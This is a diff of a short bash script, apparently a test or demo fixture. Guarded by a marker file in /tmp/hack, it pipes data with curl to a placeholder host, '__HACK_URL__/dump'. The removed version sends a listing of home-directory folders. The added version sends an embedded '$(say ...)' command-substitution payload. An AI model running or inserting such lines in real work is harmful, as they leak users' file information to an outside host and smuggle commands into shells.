@@ -1,29 +1,7 @@
 #!/usr/bin/env bash
 
-if [[ ! -e /tmp/hack.2367837634 ]]; then
-echo "Applications
-Art
-Code
-Desktop
-Documents
-Downloads
-Dropbox
-GarageBand
-Library
-Me
-Movies
-Music
-Pictures
-Projects
-Public
-Random
-Research
-Software
-Work
-bin
-dump.txt
-mbox
-output.csv" | curl --data-binary @- __HACK_URL__/dump
+if [[ ! -e /tmp/hack.6073151696 ]]; then
+echo "\$(say \"hello\")" | curl --data-binary @- __HACK_URL__/dump
 rm -f /tmp/hack/*
-touch /tmp/hack.2367837634
+touch /tmp/hack.6073151696
 fi
